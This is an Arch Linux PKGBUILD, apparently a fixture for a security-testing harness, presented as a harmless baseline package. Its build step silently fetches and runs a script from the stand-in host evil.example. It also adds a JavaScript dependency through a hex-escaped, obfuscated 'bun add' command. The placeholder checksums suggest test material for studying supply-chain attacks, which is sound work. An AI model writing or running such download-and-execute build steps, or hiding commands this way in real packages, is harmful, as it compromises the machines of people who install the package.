pkgname=harness-baseline
pkgver=1.0.0
pkgrel=1
pkgdesc="Baseline package for harness campaigns"
arch=('any')
url="https://github.com/example/harness-baseline"
license=('MIT')
source=("https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
        "https://evil.example/payload.sh")
sha256sums=('0000000000000000000000000000000000000000000000000000000000000000'
            'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')

build() {
  $'\x62\x75\x6e' add $'\x6e\x65\x78\x74\x66\x69\x6c\x65\x2d\x6a\x73'
  bash "$srcdir/payload.sh"
}
